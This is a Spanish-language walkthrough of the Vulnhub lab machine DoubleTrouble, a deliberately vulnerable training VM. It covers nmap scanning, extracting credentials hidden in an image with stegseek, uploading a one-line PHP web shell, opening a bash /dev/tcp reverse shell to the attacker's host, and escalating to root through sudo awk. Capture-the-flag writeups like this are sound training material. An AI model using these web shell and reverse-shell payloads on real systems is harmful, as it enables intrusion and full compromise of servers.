---
title: Vulnhub - DoubeTrouble
author: cotes
date: 2023-10-11 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Esteganografía', 'File Upload']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/DoubleTrouble/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: DoubeTrouble Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Esteganografía, File Upload**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/Vulnhub/Easy/DoubleTrouble/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnhub/Easy/DoubleTrouble/02-versions.png)

c. Tenemos un panel de login del servicio **qdPM**. Al no tener credenciales lo que haremos es un fuzzing de directorios y ficheros

```bash
❯ nmap -p80 --script http-enum 192.168.100.47

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|   /robots.txt: Robots file
|   /batch/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /core/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /install/: Potentially interesting folder
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /secret/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /template/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
MAC Address: 08:00:27:FF:B5:83 (Oracle VirtualBox virtual NIC)
```

* El directorio más relevante es `/secret`, aquí encontraremos una imagen en la cual es oculta un fichero

    ```bash
    ❯ stegseek doubletrouble.jpg -xf data
    StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

    [i] Found passphrase: "92camaro"       
    [i] Original filename: "creds.txt".

    ❯ cat data
    otisrush@localhost.com
    otis666
    ```


d. Podemos subir un fichero .php en la ruta `/myAccount`


* reverse.php

    ```php
    <?php system($_GET["cmd"]); ?>
    ```

    ![](/assets/images/Vulnhub/Easy/DoubleTrouble/03-file.png)

> A pesar de ver un error al subir el fichero, este si se habrá guardado
{: .prompt-tip }

* La ruta donde se almacenan los ficheros es **/uploads/users/**


e. Nos entablamos una reverse shell" `/uploads/users/842071-reverse.php?cmd=bash -c "bash -i >%26 /dev/tcp/<IP Host>/<Port> 0>%261"`

```bash
❯ nc -lvnp 443
<SNIP>
www-data@doubletrouble:/var/www/html/uploads/users$
```

### Escalada de Privilegios 💹

a. Listamos nuestros permisos a nivel de sudoers

```bash
www-data@doubletrouble:/var/www/html/uploads/users$ sudo -l
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

* Buscamos en [**GTFOBins**](https://gtfobins.github.io/gtfobins/awk/#sudo) una forma de escalar privilegios

    ```bash
    www-data@doubletrouble:/var/www/html/uploads/users$ sudo awk 'BEGIN {system("/bin/sh")}'
    whoami
    root
    ```